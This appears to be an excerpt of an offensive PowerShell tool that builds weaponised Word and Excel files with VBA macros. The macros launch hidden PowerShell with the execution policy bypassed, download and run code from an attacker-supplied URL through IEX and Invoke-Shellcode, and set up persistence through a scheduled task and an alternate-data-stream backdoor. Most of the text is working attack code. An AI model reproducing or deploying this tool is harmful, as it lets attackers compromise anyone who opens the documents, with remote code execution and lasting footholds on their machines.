<#
.SYNOPSIS
Standalone Powershell script that will generate a malicious Microsoft Office documents with a specified payload and persistence method

.DESCRIPTION
This script will generate malicious Microsoft Excel and word Documents that contain VBA macros. This script will prompt you for your attacking IP 
...
$global:Name = Read-Host "Enter the name of the Excel document (Do not include a file extension)"
$global:Name = $global:Name + ".xls"
$global:FullName = "$global:defLoc\$global:Name"
$global:Name1 = Read-Host "Enter the name of the Word document (Do not include a file extension)"
$global:Name1 = $global:Name1 + ".doc"
$global:FullName1 = "$global:defLoc\$global:Name1"
...
End Sub
 ...
 Public Function Execute() As Variant
        ...
        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Force", Null, objConfig, intProcessID
     End Function
...
Public Function Persist() As Variant
 Set fs = CreateObject("Scripting.FileSystemObject")
    ...
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Force""")
...
$word.Visible = $false
$documents01 = $word.Documents.Add()
$Worksheet01 = $word.Selection()

$wordModule = $documents01.VBProject.VBComponents.Add(1)
$wordModule.CodeModule.AddFromString($Code)
...
$documents01.SaveAs("$global:FullName1", [Microsoft.Office.Interop.word.wdSaveFormat]::wdFormatDocument)
Write-Output "Saved to file $global:Fullname1"
...
$word.Visible = $false
$documents01 = $word.Documents.Add()
$Worksheet01 = $word.Selection.Item()
...
Add-Type -AssemblyName Microsoft.Office.Interop.word
$documents01.SaveAs("$global:FullName1", [Microsoft.Office.Interop.word.wdFormat]::wdFormatDocument97)
Write-Output "Saved to file $global:Fullname1"
...
Public Function Persist() As Variant
        ...
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "Powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
     End Function
...
Public Function ADSPersist() As Variant
        ...
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$AltDSURL')); Invoke-ADSBackdoor -URL $global:IS_Url -Arguments 'Invoke-Shellcode -Force'", Null, objConfig, intProcessID
     End Function
